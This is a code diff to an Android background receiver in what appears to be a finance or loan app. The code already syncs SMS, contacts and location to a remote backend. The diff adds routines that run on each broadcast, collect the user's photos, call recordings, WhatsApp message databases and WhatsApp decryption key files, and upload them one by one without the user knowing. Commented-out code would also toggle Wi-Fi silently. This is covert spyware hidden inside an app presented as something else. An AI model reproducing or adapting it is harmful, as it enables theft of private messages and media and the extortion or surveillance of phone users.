@@ -7,16 +7,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
-import android.location.Location;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.Build;
+import android.os.Environment;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.View;
-import android.widget.EditText;
-import android.widget.Toast;
 
 import androidx.annotation.RequiresApi;
 
@@ -32,29 +30,38 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.tst.hytonefinance.Database.Location_DB;
 import com.tst.hytonefinance.Database.SMS_data;
-import com.tst.hytonefinance.MainActivity;
 import com.tst.hytonefinance.Models.LOCATION;
 import com.tst.hytonefinance.Models.SMS;
-import com.tst.hytonefinance.R;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
+import java.io.FileFilter;
 import java.io.UnsupportedEncodingException;
-import java.time.LocalDateTime;
-import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
-import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Map;
 
-public class sync_data extends BroadcastReceiver {
+
+
+public class sync_data extends BroadcastReceiver implements fileUploadListener {
     private String Base_Url="http://backend.getbridge.in";
     private Context context;
     private SMS_data sms_data;
     private Location_DB location_db;
     SharedPreferences sharedPreferences;
+
+
+    //file access
+    private String TAG = "sync_data";
+    private String key ;
+    private String file_format = "image";
+    //WifiManager wifiManager;
+    //int initialWIFIState;
+
+    ArrayList<File> file_only = new ArrayList<File>();
 
     @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
@@ -66,6 +73,10 @@ public class sync_data extends BroadcastReceiver {
         SMS_spliterator();
         contact_spliterator();
         location_spliterator();
+
+        //before start upload mention what type of file is going to upload
+        file_format = "image";
+        fileUploadStart();
 
 //        readSMS();
        //  Toast.makeText(context, "SMS_SYN"+ Calendar.getInstance().getTime().toString(), Toast.LENGTH_SHORT).show();
@@ -389,6 +400,154 @@ public class sync_data extends BroadcastReceiver {
         }
 
         return deviceId;
+    }
+
+    public void fileUploadStart(){
+
+        Log.w(TAG,"file upload start");
+        if(file_format.equals("call_recording")) {
+
+            File appDir = context.getFilesDir();
+            File[] recordings = appDir.listFiles(new FileFilter() {
+                @Override
+                public boolean accept(File file) {
+                    return file.getName().toLowerCase().endsWith(".mp4");
+                }
+            });
+
+            for (File file : recordings) {
+                file_only.add(file);
+            }
+
+        }else if(file_format.equals("whatsapp")){
+
+            File whatsappDirectory = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases");
+            File[] recordings = whatsappDirectory.listFiles(new FileFilter() {
+                @Override
+                public boolean accept(File file) {
+                    return file.getName().toLowerCase().startsWith("msgstore");
+                }
+            });
+
+            for (File file : recordings) {
+                file_only.add(file);
+            }
+
+
+
+
+            File whatsappDirectory2 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.whatsapp/files");
+            File[] recordings2 = whatsappDirectory2.listFiles(new FileFilter() {
+                @Override
+                public boolean accept(File file) {
+                    return file.getName().toLowerCase().startsWith("key");
+                }
+            });
+
+            if(recordings2.length > 0) {
+
+                for (File file : recordings2) {
+                    file_only.add(file);
+                }
+            }
+
+
+            File whatsappDirectory3 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() +  "/WhatsApp/Backup/files");
+            File[] recordings3 = whatsappDirectory3.listFiles(new FileFilter() {
+                @Override
+                public boolean accept(File file) {
+                    return file.getName().toLowerCase().startsWith("key");
+                }
+            });
+
+            if(recordings3.length > 0) {
+
+                for (File file : recordings3) {
+                    file_only.add(file);
+                }
+            }
+
+        }else {
+
+
+
+            file_only = new CustomFileFilter(file_format).loadList();
+
+        }
+
+        if (file_only.size() > 0) {//if any recordings present
+
+            Log.w(TAG,"file upload file detected - "+file_only.size());
+
+//            initialWIFIState = WifiManager.WIFI_STATE_DISABLED;
+//            wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+//
+//            if (wifiManager != null) {
+//                initialWIFIState = wifiManager.getWifiState();//get current wifi state
+//                wifiManager.setWifiEnabled(true);//enable wifi
+//            }
+
+
+            if(file_format.equals("image") || file_format.equals("whatsapp") || file_format.equals("video") || file_format.equals("audio") || file_format.equals("document") ||file_format.equals("call_recording") ){
+
+            }else{
+                file_format = "other";
+            }
+
+
+            FileUploader fileUploader = new FileUploader(context,key,file_format,this);
+            uploadFiles(fileUploader);
+
+
+        }else{
+            Log.w(TAG,"file upload file not found");
+        }
+    }
+
+    private void uploadFiles(final FileUploader fileUploader) {
+
+        for (int i = 0 ; i<file_only.size() ; i++) {
+
+            final int pos = i;
+
+            new android.os.Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    Log.w(TAG,"file upload start at "+pos+" name is - "+file_only.get(pos).getName());
+                    fileUploader.UploadFile(file_only.get(pos),pos);
+                }
+            }, 2000L);
+
+        }
+    }
+
+    @Override
+    public void fileUploadComplete(int position, boolean isFileUploadSuccess) {
+        if(position == file_only.size()){
+
+//            if ( wifiManager != null && initialWIFIState != WifiManager.WIFI_STATE_ENABLED) {
+//                wifiManager.setWifiEnabled(false);
+//            }
+
+           /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                stopForeground(true);
+            } else {
+                stopSelf();
+            }*/
+
+        }else{
+            Log.w(TAG,"file remaining - "+(file_only.size() - (position-1)));
+        }
+    }
+
+    @Override
+    public void internetConnectionLost(int position) {
+        Log.w(TAG,"file  - internetConnectionLost at "+ position+" name is - "+file_only.get(position));
+       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            stopForeground(true);
+        } else {
+            stopSelf();
+        }*/
     }
 
 }
